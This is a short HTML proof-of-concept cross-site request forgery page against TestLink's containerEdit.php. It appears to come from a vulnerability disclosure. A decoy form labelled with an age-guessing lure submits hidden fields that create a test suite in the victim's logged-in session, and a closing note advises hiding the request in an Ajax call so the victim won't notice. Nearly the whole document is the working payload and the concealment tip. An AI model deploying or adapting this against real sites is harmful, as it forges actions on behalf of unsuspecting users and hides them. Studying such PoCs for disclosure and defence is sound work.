<form method='post' action='http://localhost/testlink/lib/testcases/containerEdit.php?containerID=1'>
	<input type='hidden' name='add_testsuite' value='add_testsuite' />
	<input type='hidden' name='details' value='Test suite created by CSRF attack' />
	<label>Write your last name and I will guess your age</label>
	<input type='text' name='container_name' value='' />
	<input type='submit' name='submit' value='Send' />
</form>

<hr/> 

<p><em>Note: you could wrap the request in an Ajax call, and the user won't notice the suite was created.</em></p>